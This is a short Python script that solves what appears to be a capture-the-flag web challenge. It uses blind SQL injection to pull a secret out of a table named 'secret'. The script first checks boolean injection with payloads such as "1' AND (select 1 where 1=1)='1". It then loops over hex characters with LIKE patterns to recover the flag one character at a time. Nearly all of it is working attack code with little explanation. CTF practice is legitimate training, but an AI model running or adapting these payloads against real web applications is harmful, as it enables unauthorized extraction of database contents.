#!/usr/bin/env python3

from Inj import Inj

inj = Inj('http://web-17.challs.olicyber.it')

def sqli(where):
    ret = "1' AND (select 1 from secret where {})='1".format(where)
    return ret

def dd(s):
    return bytes.fromhex(s).decode('utf-8')

print("First try to get a succes standard result (id=1)")
response, error = inj.blind('1')
print(response)

print("Now inject an arbitrary SQL query 'where 1=1'")
# SELECT * FROM main WHERE id='1' AND (select 1 where 1=1)='1'
response, error = inj.blind("1' AND (select 1 where 1=1)='1")
print(response)
print ("Now inject an arbitrary SQL query 'where 1=0'")
response, error = inj.blind("1' AND (select 1 where 1=0)='1")
print(response)

# so we can use sqli
print("We are ready to get the flag asecret in table secret")

dictionary =  "0123456789abcdef";

result = ""

while True:
    for c in dictionary:
        response, error = inj.blind(sqli(f"hex(asecret) like '{result+c}%'"))
        if response == 'Success':
            print("\nWe found a match: ", c)
            result += c
            print("Partial flag in hex is {}".format(result))
            if len(result) % 2 == 0:
                print("Partial Flag in string is:", dd(result))
            break
    else:
        break
    
print("Flag is:", dd(result))
